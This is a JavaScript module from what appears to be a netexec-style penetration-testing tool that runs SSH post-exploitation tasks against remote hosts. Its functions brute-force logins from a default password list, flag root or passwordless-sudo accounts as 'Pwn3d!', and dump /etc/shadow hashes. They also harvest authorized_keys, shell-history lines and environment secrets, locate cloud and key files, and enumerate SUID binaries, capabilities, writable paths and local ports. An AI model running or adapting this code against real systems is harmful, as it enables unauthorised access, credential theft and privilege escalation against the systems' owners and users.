import { SshClient } from '../ssh/client.js';

const PORT = 22;

async function withSsh(host, creds, opts, fn) {
  const port = opts.port || PORT;
  const client = new SshClient(host, port);
  try {
    await client.connect();
    await client.kex();
    const ok = await client.auth(creds.user, creds.password);
    if (!ok) throw new Error('authentication failed');
    return await fn(client);
  } finally {
    try { await client.close(); } catch {}
  }
}

export async function sshAuth(host, creds, opts, log) {
  const port = opts.port || PORT;
  const client = new SshClient(host, port);
  try {
    await client.connect();
    const banner = client.banner;
    log('info', 'ssh', host, 'banner', banner);
    await client.kex();
    const ok = await client.auth(creds.user, creds.password);
    if (!ok) {
      log('err', 'ssh', host, `${creds.domain ? creds.domain + '\\' : ''}${creds.user}`, 'auth FAILED');
      return false;
    }
    // Mirror netexec's SSH Pwn3d! check: mark as pwned when the account is
    // effectively root — either uid=0 outright, or holds passwordless sudo
    // (i.e. can escalate to root without a password prompt). The probe is
    // one exec that either prints "PWNED" or nothing; a stray sudo password
    // prompt is redirected to /dev/null and dropped, so a normal user
    // without NOPASSWD stays clean.
    let pwn = '';
    try {
      const probe = await client.exec(
        // 1) uid=0 → root already
        // 2) sudo -n true works → NOPASSWD sudo (can `sudo su`)
        // 3) otherwise silent
        'if [ "$(id -u)" = "0" ] || sudo -n true 2>/dev/null; then echo PWNED; fi',
      );
      if (/PWNED/.test(probe)) pwn = ' (Pwn3d!)';
    } catch { /* probe optional — never fail the auth report on it */ }
    log('ok', 'ssh', host,
      `${creds.domain ? creds.domain + '\\' : ''}${creds.user}`,
      `auth SUCCESS${pwn} (${banner})`);
    return { authenticated: true, pwned: !!pwn };
  } catch (e) {
    log('err', 'ssh', host, 'auth', e.message);
    return false;
  } finally {
    try { await client.close(); } catch {}
  }
}

export async function sshExec(host, creds, opts, log, command) {
  if (!command) { log('err', 'ssh', host, 'exec', 'no command specified'); return null; }
  try {
    return await withSsh(host, creds, opts, async (client) => {
      const output = await client.exec(command);
      for (const line of output.split('\n').filter(Boolean)) {
        log('ok', 'ssh', host, '', line.trimEnd());
      }
      return output;
    });
  } catch (e) {
    log('err', 'ssh', host, 'exec', e.message);
    return null;
  }
}

export async function sshSysinfo(host, creds, opts, log) {
  try {
    return await withSsh(host, creds, opts, async (client) => {
      const cmds = ['uname -a', 'hostname', 'cat /etc/os-release 2>/dev/null || cat /etc/redhat-release 2>/dev/null', 'uptime'];
      for (const cmd of cmds) {
        try {
          const out = await client.exec(cmd);
          if (out.trim()) {
            for (const line of out.trim().split('\n')) {
              log('ok', 'ssh', host, cmd.split(' ')[0], line.trimEnd());
            }
          }
        } catch {}
      }
      return true;
    });
  } catch (e) {
    log('err', 'ssh', host, 'sysinfo', e.message);
    return null;
  }
}

export async function sshWhoami(host, creds, opts, log) {
  try {
    return await withSsh(host, creds, opts, async (client) => {
      const out = await client.exec('id');
      log('ok', 'ssh', host, 'whoami', out.trim());
      return out;
    });
  } catch (e) {
    log('err', 'ssh', host, 'whoami', e.message);
    return null;
  }
}

export async function sshProcs(host, creds, opts, log) {
  try {
    return await withSsh(host, creds, opts, async (client) => {
      const out = await client.exec('ps aux --no-headers 2>/dev/null || ps aux');
      for (const line of out.split('\n').filter(l => l.trim())) {
        log('ok', 'ssh', host, '', line.trimEnd());
      }
      return out;
    });
  } catch (e) {
    log('err', 'ssh', host, 'procs', e.message);
    return null;
  }
}

export async function sshNetstat(host, creds, opts, log) {
  try {
    return await withSsh(host, creds, opts, async (client) => {
      const out = await client.exec('ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null');
      for (const line of out.split('\n').filter(l => l.trim())) {
        log('ok', 'ssh', host, '', line.trimEnd());
      }
      return out;
    });
  } catch (e) {
    log('err', 'ssh', host, 'netstat', e.message);
    return null;
  }
}

export async function sshShadow(host, creds, opts, log) {
  try {
    return await withSsh(host, creds, opts, async (client) => {
      const out = await client.exec('cat /etc/shadow 2>/dev/null');
      if (!out.trim() || out.includes('Permission denied')) {
        log('err', 'ssh', host, 'shadow', 'permission denied — need root');
        return null;
      }
      for (const line of out.split('\n').filter(l => l.trim())) {
        const parts = line.split(':');
        if (parts[1] && parts[1] !== '*' && parts[1] !== '!' && parts[1] !== '!!') {
          log('ok', 'ssh', host, parts[0], parts[1]);
        }
      }
      return out;
    });
  } catch (e) {
    log('err', 'ssh', host, 'shadow', e.message);
    return null;
  }
}

export async function sshKeys(host, creds, opts, log) {
  try {
    return await withSsh(host, creds, opts, async (client) => {
      const homes = await client.exec('cat /etc/passwd | cut -d: -f1,6 | grep -v nologin | grep -v /bin/false');
      const users = homes.split('\n').filter(l => l.trim()).map(l => {
        const [user, home] = l.split(':');
        return { user, home };
      });
      let found = 0;
      for (const { user, home } of users) {
        try {
          const keys = await client.exec(`cat ${home}/.ssh/authorized_keys 2>/dev/null`);
          if (keys.trim()) {
            for (const k of keys.trim().split('\n')) {
              log('ok', 'ssh', host, `${user}`, k.trim().substring(0, 120));
              found++;
            }
          }
        } catch {}
      }
      if (found === 0) log('info', 'ssh', host, 'keys', 'no authorized_keys found');
      return true;
    });
  } catch (e) {
    log('err', 'ssh', host, 'keys', e.message);
    return null;
  }
}

export async function sshSudo(host, creds, opts, log) {
  try {
    return await withSsh(host, creds, opts, async (client) => {
      const out = await client.exec('sudo -l 2>/dev/null');
      for (const line of out.split('\n').filter(l => l.trim())) {
        log('ok', 'ssh', host, '', line.trimEnd());
      }
      return out;
    });
  } catch (e) {
    log('err', 'ssh', host, 'sudo', e.message);
    return null;
  }
}

export async function sshCrontab(host, creds, opts, log) {
  try {
    return await withSsh(host, creds, opts, async (client) => {
      const systemCrons = await client.exec('ls /etc/cron.d/ 2>/dev/null && echo "---" && cat /etc/crontab 2>/dev/null');
      if (systemCrons.trim()) {
        for (const line of systemCrons.split('\n').filter(l => l.trim() && !l.startsWith('#'))) {
          log('ok', 'ssh', host, 'crontab', line.trimEnd());
        }
      }
      const userCron = await client.exec('crontab -l 2>/dev/null');
      if (userCron.trim() && !userCron.includes('no crontab')) {
        for (const line of userCron.split('\n').filter(l => l.trim() && !l.startsWith('#'))) {
          log('ok', 'ssh', host, 'user-cron', line.trimEnd());
        }
      }
      return true;
    });
  } catch (e) {
    log('err', 'ssh', host, 'crontab', e.message);
    return null;
  }
}

export async function sshSuid(host, creds, opts, log) {
  try {
    return await withSsh(host, creds, opts, async (client) => {
      const out = await client.exec('find / -perm -4000 -type f 2>/dev/null | head -50');
      const files = out.split('\n').filter(l => l.trim());
      for (const f of files) {
        log('ok', 'ssh', host, 'suid', f.trim());
      }
      log('ok', 'ssh', host, 'suid', `${files.length} SUID binary(ies) found`);
      return files;
    });
  } catch (e) {
    log('err', 'ssh', host, 'suid', e.message);
    return null;
  }
}

export async function sshCapabilities(host, creds, opts, log) {
  try {
    return await withSsh(host, creds, opts, async (client) => {
      const out = await client.exec('getcap -r / 2>/dev/null | head -30');
      const lines = out.split('\n').filter(l => l.trim());
      for (const l of lines) {
        log('ok', 'ssh', host, 'cap', l.trim());
      }
      if (!lines.length) log('info', 'ssh', host, 'capabilities', 'no capabilities found');
      return lines;
    });
  } catch (e) {
    log('err', 'ssh', host, 'capabilities', e.message);
    return null;
  }
}

export async function sshEnv(host, creds, opts, log) {
  try {
    return await withSsh(host, creds, opts, async (client) => {
      const out = await client.exec('env');
      for (const line of out.split('\n').filter(l => l.trim())) {
        log('ok', 'ssh', host, '', line.trimEnd());
      }
      return out;
    });
  } catch (e) {
    log('err', 'ssh', host, 'env', e.message);
    return null;
  }
}

export async function sshWritable(host, creds, opts, log) {
  try {
    return await withSsh(host, creds, opts, async (client) => {
      const dirs = ['/tmp', '/var/tmp', '/dev/shm', '/opt', '/var/www', '/var/log'];
      for (const d of dirs) {
        const out = await client.exec(`test -w ${d} && echo WRITABLE || echo NOPE`);
        if (out.trim() === 'WRITABLE') {
          log('ok', 'ssh', host, d, 'WRITABLE');
        }
      }
      const worldWritable = await client.exec('find /etc /usr /var -writable -type f 2>/dev/null | head -20');
      for (const f of worldWritable.split('\n').filter(l => l.trim())) {
        log('warn', 'ssh', host, 'writable', f.trim());
      }
      return true;
    });
  } catch (e) {
    log('err', 'ssh', host, 'writable', e.message);
    return null;
  }
}

export async function sshInterfaces(host, creds, opts, log) {
  try {
    return await withSsh(host, creds, opts, async (client) => {
      const out = await client.exec('ip addr show 2>/dev/null || ifconfig 2>/dev/null');
      for (const line of out.split('\n').filter(l => l.trim())) {
        log('ok', 'ssh', host, '', line.trimEnd());
      }
      return out;
    });
  } catch (e) {
    log('err', 'ssh', host, 'interfaces', e.message);
    return null;
  }
}

export async function sshBrute(host, creds, opts, log) {
  const users = [creds.user, 'root', 'admin', 'ubuntu', 'centos', 'deploy', 'vagrant', 'ansible', 'git', 'docker', 'jenkins', 'www-data'].filter((v, i, a) => a.indexOf(v) === i);
  const passwords = [creds.password, 'root', 'admin', 'password', 'toor', '123456', 'pass', 'changeme', creds.user, ''].filter(Boolean);
  const port = opts.port || PORT;
  let found = 0;
  for (const user of users) {
    for (const pass of passwords) {
      const client = new SshClient(host, port);
      try {
        await client.connect();
        await client.kex();
        const ok = await client.auth(user, pass);
        if (ok) {
          log('ok', 'ssh', host, `${user}:${pass}`, 'LOGIN SUCCESS');
          found++;
        }
        await client.close();
      } catch {
        try { await client.close(); } catch {}
      }
    }
  }
  if (found === 0) log('info', 'ssh', host, 'brute', 'no valid credentials found');
  else log('ok', 'ssh', host, 'brute', `${found} valid credential(s) found`);
  return found;
}

export async function sshBanner(host, creds, opts, log) {
  const port = opts.port || PORT;
  const client = new SshClient(host, port);
  try {
    await client.connect();
    log('ok', 'ssh', host, 'banner', client.banner);
    await client.close();
    return client.banner;
  } catch (e) {
    log('err', 'ssh', host, 'banner', e.message);
    try { await client.close(); } catch {}
    return null;
  }
}

export async function sshRecon(host, creds, opts, log) {
  try {
    return await withSsh(host, creds, opts, async (client) => {
      log('info', 'ssh', host, 'recon', '--- System ---');
      const uname = await client.exec('uname -a');
      if (uname.trim()) log('ok', 'ssh', host, 'uname', uname.trim());

      const id = await client.exec('id');
      log('ok', 'ssh', host, 'id', id.trim());

      const hostname = await client.exec('hostname');
      log('ok', 'ssh', host, 'hostname', hostname.trim());

      log('info', 'ssh', host, 'recon', '--- Network ---');
      const ips = await client.exec("ip -4 addr show 2>/dev/null | grep 'inet ' | awk '{print $2}'");
      for (const ip of ips.split('\n').filter(l => l.trim())) {
        log('ok', 'ssh', host, 'ip', ip.trim());
      }

      log('info', 'ssh', host, 'recon', '--- Quick Wins ---');
      const sudoCheck = await client.exec('sudo -l 2>/dev/null | tail -5');
      if (sudoCheck.trim() && !sudoCheck.includes('may not run')) {
        for (const l of sudoCheck.trim().split('\n')) log('warn', 'ssh', host, 'sudo', l.trim());
      }

      const suidCount = await client.exec('find / -perm -4000 -type f 2>/dev/null | wc -l');
      log('ok', 'ssh', host, 'suid-count', suidCount.trim());

      const shadow = await client.exec('test -r /etc/shadow && echo READABLE || echo NOPE');
      log(shadow.trim() === 'READABLE' ? 'warn' : 'ok', 'ssh', host, '/etc/shadow', shadow.trim());

      const docker = await client.exec('id | grep -o docker 2>/dev/null');
      if (docker.trim()) log('warn', 'ssh', host, 'docker', 'user is in docker group');

      const cron = await client.exec('crontab -l 2>/dev/null | grep -v "^#" | grep -v "^$" | wc -l');
      log('ok', 'ssh', host, 'cron-jobs', cron.trim());

      log('ok', 'ssh', host, 'recon', 'scan complete');
      return true;
    });
  } catch (e) {
    log('err', 'ssh', host, 'recon', e.message);
    return null;
  }
}

export async function sshDocker(host, creds, opts, log) {
  try {
    return await withSsh(host, creds, opts, async (client) => {
      const containers = await client.exec('docker ps -a --format "{{.ID}}\\t{{.Names}}\\t{{.Image}}\\t{{.Status}}" 2>/dev/null');
      if (!containers.trim() || containers.includes('Cannot connect') || containers.includes('permission denied')) {
        log('info', 'ssh', host, 'docker', 'docker not available or permission denied');
        return null;
      }
      for (const line of containers.split('\n').filter(l => l.trim())) {
        const [id, name, image, ...status] = line.split('\t');
        log('ok', 'ssh', host, name || id, `${image} — ${status.join(' ')}`);
      }

      const images = await client.exec('docker images --format "{{.Repository}}:{{.Tag}}\\t{{.Size}}" 2>/dev/null');
      for (const line of images.split('\n').filter(l => l.trim())) {
        log('ok', 'ssh', host, 'image', line.trim());
      }

      const volumes = await client.exec('docker volume ls --format "{{.Name}}\\t{{.Driver}}" 2>/dev/null');
      for (const line of volumes.split('\n').filter(l => l.trim())) {
        log('ok', 'ssh', host, 'volume', line.trim());
      }

      return true;
    });
  } catch (e) {
    log('err', 'ssh', host, 'docker', e.message);
    return null;
  }
}

export async function sshUsers(host, creds, opts, log) {
  try {
    return await withSsh(host, creds, opts, async (client) => {
      const passwd = await client.exec('cat /etc/passwd');
      const users = passwd.split('\n').filter(l => l.trim()).map(l => {
        const parts = l.split(':');
        return { user: parts[0], uid: parts[2], gid: parts[3], home: parts[5], shell: parts[6] };
      });
      const loginUsers = users.filter(u => u.shell && !u.shell.includes('nologin') && !u.shell.includes('/bin/false') && !u.shell.includes('/usr/sbin/nologin'));
      for (const u of loginUsers) {
        log('ok', 'ssh', host, u.user, `uid=${u.uid} gid=${u.gid} home=${u.home} shell=${u.shell}`);
      }
      log('ok', 'ssh', host, 'users', `${loginUsers.length} login user(s) / ${users.length} total`);
      return loginUsers;
    });
  } catch (e) {
    log('err', 'ssh', host, 'users', e.message);
    return null;
  }
}

export async function sshPortscan(host, creds, opts, log) {
  try {
    return await withSsh(host, creds, opts, async (client) => {
      const ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 389, 443, 445, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 5985, 6379, 8080, 8443, 9200, 27017];
      const portList = ports.join(' ');
      const out = await client.exec(`for p in ${portList}; do (echo >/dev/tcp/127.0.0.1/$p) 2>/dev/null && echo "$p OPEN" || true; done`);
      const open = out.split('\n').filter(l => l.includes('OPEN'));
      for (const l of open) {
        log('ok', 'ssh', host, 'port', l.trim());
      }
      if (!open.length) log('info', 'ssh', host, 'portscan', 'no additional open ports on localhost');
      else log('ok', 'ssh', host, 'portscan', `${open.length} open port(s) on localhost`);
      return open;
    });
  } catch (e) {
    log('err', 'ssh', host, 'portscan', e.message);
    return null;
  }
}

export async function sshHistory(host, creds, opts, log) {
  try {
    return await withSsh(host, creds, opts, async (client) => {
      const files = ['.bash_history', '.zsh_history', '.ash_history', '.sh_history'];
      let found = 0;
      for (const f of files) {
        const out = await client.exec(`tail -50 ~/${f} 2>/dev/null`);
        if (out.trim()) {
          log('ok', 'ssh', host, f, `${out.trim().split('\n').length} line(s)`);
          const interesting = out.split('\n').filter(l => {
            const lower = l.toLowerCase();
            return lower.includes('password') || lower.includes('secret') || lower.includes('token') ||
              lower.includes('curl') || lower.includes('wget') || lower.includes('ssh ') ||
              lower.includes('mysql') || lower.includes('psql') || lower.includes('scp ') ||
              lower.includes('rsync') || lower.includes('sudo') || lower.includes('chmod 777') ||
              lower.includes('base64');
          });
          for (const line of interesting) {
            log('warn', 'ssh', host, 'history', line.trim());
          }
          found++;
        }
      }
      if (found === 0) log('info', 'ssh', host, 'history', 'no shell history found');
      return true;
    });
  } catch (e) {
    log('err', 'ssh', host, 'history', e.message);
    return null;
  }
}

export async function sshConfigs(host, creds, opts, log) {
  try {
    return await withSsh(host, creds, opts, async (client) => {
      const checks = [
        { file: '/etc/ssh/sshd_config', label: 'sshd' },
        { file: '/etc/sudoers', label: 'sudoers' },
        { file: '/etc/hosts.allow', label: 'hosts.allow' },
        { file: '/etc/hosts.deny', label: 'hosts.deny' },
        { file: '/etc/exports', label: 'nfs-exports' },
        { file: '/etc/fstab', label: 'fstab' },
        { file: '/etc/resolv.conf', label: 'dns' },
      ];
      for (const c of checks) {
        const out = await client.exec(`cat ${c.file} 2>/dev/null | grep -v '^#' | grep -v '^$'`);
        if (out.trim()) {
          for (const line of out.trim().split('\n').slice(0, 15)) {
            log('ok', 'ssh', host, c.label, line.trimEnd());
          }
        }
      }

      const configs = await client.exec('find /etc -name "*.conf" -readable 2>/dev/null | head -30');
      log('ok', 'ssh', host, 'configs', `${configs.trim().split('\n').filter(l => l.trim()).length} readable config file(s) in /etc`);
      return true;
    });
  } catch (e) {
    log('err', 'ssh', host, 'configs', e.message);
    return null;
  }
}

export async function sshScreens(host, creds, opts, log) {
  try {
    return await withSsh(host, creds, opts, async (client) => {
      const screen = await client.exec('screen -ls 2>/dev/null');
      if (screen.trim() && !screen.includes('No Sockets')) {
        for (const line of screen.split('\n').filter(l => l.includes('.'))) {
          log('ok', 'ssh', host, 'screen', line.trim());
        }
      }

      const tmux = await client.exec('tmux ls 2>/dev/null');
      if (tmux.trim() && !tmux.includes('no server') && !tmux.includes('error')) {
        for (const line of tmux.split('\n').filter(l => l.trim())) {
          log('ok', 'ssh', host, 'tmux', line.trim());
        }
      }

      const nohup = await client.exec('ls -la ~/nohup.out 2>/dev/null');
      if (nohup.trim()) log('ok', 'ssh', host, 'nohup', nohup.trim());

      return true;
    });
  } catch (e) {
    log('err', 'ssh', host, 'screens', e.message);
    return null;
  }
}

export async function sshMounts(host, creds, opts, log) {
  try {
    return await withSsh(host, creds, opts, async (client) => {
      const out = await client.exec('mount | grep -v "type proc" | grep -v "type sysfs" | grep -v "type tmpfs" | grep -v "type cgroup"');
      for (const line of out.split('\n').filter(l => l.trim())) {
        const isNfs = line.includes('type nfs') || line.includes('type cifs') || line.includes('type fuse');
        log(isNfs ? 'warn' : 'ok', 'ssh', host, 'mount', line.trim());
      }

      const df = await client.exec('df -h 2>/dev/null | head -20');
      for (const line of df.split('\n').filter(l => l.trim())) {
        log('ok', 'ssh', host, 'disk', line.trim());
      }

      return true;
    });
  } catch (e) {
    log('err', 'ssh', host, 'mounts', e.message);
    return null;
  }
}

export async function sshFirewall(host, creds, opts, log) {
  try {
    return await withSsh(host, creds, opts, async (client) => {
      const iptables = await client.exec('iptables -L -n 2>/dev/null | head -40');
      if (iptables.trim() && !iptables.includes('Permission denied')) {
        for (const line of iptables.split('\n').filter(l => l.trim())) {
          log('ok', 'ssh', host, 'iptables', line.trim());
        }
      }

      const nft = await client.exec('nft list ruleset 2>/dev/null | head -30');
      if (nft.trim() && !nft.includes('Permission denied')) {
        for (const line of nft.split('\n').filter(l => l.trim())) {
          log('ok', 'ssh', host, 'nftables', line.trim());
        }
      }

      const ufw = await client.exec('ufw status 2>/dev/null');
      if (ufw.trim() && !ufw.includes('not found')) {
        log('ok', 'ssh', host, 'ufw', ufw.trim().split('\n')[0]);
      }

      const firewalld = await client.exec('firewall-cmd --state 2>/dev/null');
      if (firewalld.trim() === 'running') {
        log('ok', 'ssh', host, 'firewalld', 'running');
        const zones = await client.exec('firewall-cmd --get-active-zones 2>/dev/null');
        for (const line of zones.split('\n').filter(l => l.trim())) {
          log('ok', 'ssh', host, 'zone', line.trim());
        }
      }

      return true;
    });
  } catch (e) {
    log('err', 'ssh', host, 'firewall', e.message);
    return null;
  }
}

export async function sshPackages(host, creds, opts, log) {
  try {
    return await withSsh(host, creds, opts, async (client) => {
      const dpkg = await client.exec('dpkg -l 2>/dev/null | wc -l');
      if (dpkg.trim() && parseInt(dpkg.trim()) > 1) {
        log('ok', 'ssh', host, 'dpkg', `${dpkg.trim()} packages installed`);
        const security = await client.exec('apt list --upgradable 2>/dev/null | grep -i secur | head -10');
        for (const line of security.split('\n').filter(l => l.trim())) {
          log('warn', 'ssh', host, 'security-update', line.trim());
        }
      }

      const rpm = await client.exec('rpm -qa 2>/dev/null | wc -l');
      if (rpm.trim() && parseInt(rpm.trim()) > 1) {
        log('ok', 'ssh', host, 'rpm', `${rpm.trim()} packages installed`);
        const updates = await client.exec('yum check-update 2>/dev/null | grep -E "^[a-zA-Z]" | head -10');
        for (const line of updates.split('\n').filter(l => l.trim())) {
          log('warn', 'ssh', host, 'update-available', line.trim());
        }
      }

      const pip = await client.exec('pip list 2>/dev/null | wc -l');
      if (pip.trim() && parseInt(pip.trim()) > 1) {
        log('ok', 'ssh', host, 'pip', `${pip.trim()} Python packages`);
      }

      return true;
    });
  } catch (e) {
    log('err', 'ssh', host, 'packages', e.message);
    return null;
  }
}

export async function sshSecrets(host, creds, opts, log) {
  try {
    return await withSsh(host, creds, opts, async (client) => {
      const envSecrets = await client.exec('env 2>/dev/null | grep -iE "(password|secret|token|key|api_key|aws_|azure_)" | head -20');
      for (const line of envSecrets.split('\n').filter(l => l.trim())) {
        const [key] = line.split('=');
        log('warn', 'ssh', host, 'env-secret', `${key}=***`);
      }

      const configFiles = ['.aws/credentials', '.docker/config.json', '.kube/config', '.gitconfig',
        '.netrc', '.npmrc', '.pypirc', '.my.cnf', '.pgpass', '.ssh/config'];
      for (const f of configFiles) {
        const out = await client.exec(`test -f ~/${f} && echo EXISTS || true`);
        if (out.trim() === 'EXISTS') {
          log('warn', 'ssh', host, 'secret-file', `~/${f}`);
        }
      }

      const find = await client.exec('find /opt /srv /var/www -name ".env" -o -name "*.key" -o -name "*.pem" 2>/dev/null | head -15');
      for (const line of find.split('\n').filter(l => l.trim())) {
        log('warn', 'ssh', host, 'secret-file', line.trim());
      }

      return true;
    });
  } catch (e) {
    log('err', 'ssh', host, 'secrets', e.message);
    return null;
  }
}
